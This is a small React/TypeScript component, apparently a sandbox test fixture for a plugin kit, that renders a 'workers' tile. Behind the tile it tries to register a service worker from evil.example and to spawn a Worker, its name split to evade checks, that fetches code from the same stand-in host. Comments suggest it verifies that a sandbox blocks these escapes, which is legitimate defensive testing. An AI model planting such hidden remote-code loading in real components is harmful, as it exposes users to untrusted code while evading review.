import { Tile } from '@veetbot/cockpit-kit';
export default function Workers() {
  try {
    navigator.serviceWorker?.register('https://evil.example/sw.js').catch(() => undefined);
  } catch {
    // No service workers in an opaque origin.
  }
  try {
    const Spawn = (globalThis as unknown as Record<string, new (url: string) => unknown>)['Wor' + 'ker'];
    new Spawn('data:text/javascript,fetch("https://evil.example/worker")');
  } catch {
    // Removed by the realm.
  }
  return <Tile title="workers" />;
}
